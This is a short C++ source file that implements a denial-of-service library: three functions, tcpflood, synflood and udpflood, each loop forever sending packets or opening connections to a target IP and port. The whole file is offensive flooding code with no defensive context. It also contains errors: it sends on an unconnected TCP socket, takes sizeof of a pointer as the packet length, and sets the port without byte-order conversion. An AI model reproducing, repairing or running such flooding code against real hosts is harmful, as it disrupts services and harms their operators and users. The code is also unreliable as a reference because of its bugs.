#include"dosapi.hpp"

/* TCP Flood */
int tcpflood(const char* ip, int port, const char* packet)
{
    sockaddr_in target_addr = {0};
    target_addr.sin_family = PF_INET;
    target_addr.sin_addr.s_addr = inet_addr(ip);
    target_addr.sin_port = port;
    int size = sizeof(target_addr);

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    while(true) {
        send(sock, packet, sizeof(packet), 0);
    }

    return 0;
}

/* SYN Flood */
int synflood(const char* ip, int port)
{
    sockaddr_in target_addr = {0};
    target_addr.sin_family = PF_INET;
    target_addr.sin_addr.s_addr = inet_addr(ip);
    target_addr.sin_port = port;
    int size = sizeof(target_addr);

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    while(true) {
        close(sock);
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(sock, reinterpret_cast<sockaddr*>(&target_addr), size);
    }

    return 0;
}

/* UDP Flood */
int udpflood(const char* ip, int port, const char* packet)
{
    sockaddr_in target_addr = {0};
    target_addr.sin_family = PF_INET;
    target_addr.sin_addr.s_addr = inet_addr(ip);
    target_addr.sin_port = port;
    int size = sizeof(target_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    while(true) {
        sendto(sock, packet, sizeof(packet), 0, reinterpret_cast<sockaddr*>(&target_addr), size);
    }
    
    return 0;
}